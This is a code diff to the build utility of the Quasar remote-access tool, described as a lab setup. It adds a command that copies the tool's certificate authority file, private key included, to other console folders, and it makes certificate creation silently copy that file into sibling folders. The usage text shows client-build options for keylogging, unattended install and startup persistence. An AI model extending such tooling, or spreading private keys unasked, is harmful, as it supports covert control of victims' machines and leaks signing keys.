@@ -33,6 +33,7 @@ namespace Quasar.Server.Build
             return string.Equals(args[0], "--build-client", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(args[0], "--make-cert", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(args[0], "--write-config", StringComparison.OrdinalIgnoreCase) ||
+                   string.Equals(args[0], "--sync-ca", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(args[0], "--help-lab", StringComparison.OrdinalIgnoreCase);
         }
 
@@ -48,6 +49,8 @@ namespace Quasar.Server.Build
                         return BuildClient(args);
                     case "--write-config":
                         return WriteConfiguration(args);
+                    case "--sync-ca":
+                        return SyncCertificate(args);
                     default:
                         PrintUsage();
                         return 0;
@@ -73,12 +76,47 @@ namespace Quasar.Server.Build
                 Directory.CreateDirectory(directory);
 
             var certificate = CertificateHelper.CreateCertificateAuthority(name, strength);
-            File.WriteAllBytes(path, certificate.Export(X509ContentType.Pkcs12));
+            var payload = certificate.Export(X509ContentType.Pkcs12);
+            File.WriteAllBytes(path, payload);
+
+            // Keep every control side tool on the very same authority: a console running a
+            // different certificate silently rejects every baseline sample.
+            LabCertificate.PropagateToSiblingFolders(path, payload);
 
             Console.WriteLine("certificate=" + path);
             Console.WriteLine("subject=" + certificate.Subject);
             Console.WriteLine("thumbprint=" + certificate.Thumbprint);
             Console.WriteLine("notafter=" + certificate.NotAfter.ToString("o", CultureInfo.InvariantCulture));
+            return 0;
+        }
+
+        /// <summary>
+        /// Copies the laboratory authority of this tool into another control side folder, so a
+        /// console which was installed separately still accepts the produced baseline samples.
+        /// </summary>
+        private static int SyncCertificate(string[] args)
+        {
+            var options = Parse(args);
+            var target = Get(options, "to", null);
+            if (string.IsNullOrEmpty(target))
+                throw new ArgumentException("--to is required, e.g. --sync-ca --to .\\ControlConsole");
+
+            var source = Quasar.Server.Models.Settings.CertificatePath;
+            if (!File.Exists(source))
+                throw new FileNotFoundException("Laboratory certificate not found. Run --make-cert first.", source);
+
+            var targetDirectory = Path.GetFullPath(target);
+            if (!Directory.Exists(targetDirectory))
+                throw new DirectoryNotFoundException("Target folder does not exist: " + targetDirectory);
+
+            var destination = Path.Combine(targetDirectory, Path.GetFileName(source));
+            File.Copy(source, destination, true);
+
+            var authority = new X509Certificate2(source, string.Empty, X509KeyStorageFlags.Exportable);
+            Console.WriteLine("authority=" + source);
+            Console.WriteLine("synced_to=" + destination);
+            Console.WriteLine("thumbprint=" + authority.Thumbprint);
+            Console.WriteLine("Every control side tool must use this same quasar.p12.");
             return 0;
         }
 
@@ -244,6 +282,9 @@ namespace Quasar.Server.Build
             Console.WriteLine("               --startup-name --log-dir --icon --unattended --install --startup --keylogger");
             Console.WriteLine();
             Console.WriteLine("  ... --write-config --out <dir> --hosts \"<ip:port;>\" [--tag --mutex --subnet]");
+            Console.WriteLine();
+            Console.WriteLine("  ... --sync-ca --to <dir>");
+            Console.WriteLine("      Copies this tool's laboratory authority into another control side folder.");
             Console.WriteLine("      Only (re)writes config.json so one build can be re-pointed between conditions.");
         }
     }
